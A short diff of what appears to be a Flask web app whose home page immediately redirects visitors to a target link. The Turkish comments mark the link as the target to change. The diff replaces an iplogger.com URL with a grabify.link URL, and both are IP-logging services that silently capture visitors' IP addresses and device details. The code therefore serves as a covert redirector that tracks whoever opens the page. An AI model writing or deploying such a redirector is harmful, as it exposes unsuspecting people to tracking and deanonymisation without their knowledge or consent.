@@ -6,7 +6,7 @@ import time
 app = Flask(__name__)
 
 # HEDEF LİNK - BUNU DEĞİŞTİR
-HEDEF_LINK = "https://iplogger.com/2Bkec5.lnk"
+HEDEF_LINK = "https://grabify.link/0I5H2O"
 
 # Ana sayfa - direkt yönlendirme
 @app.route('/')
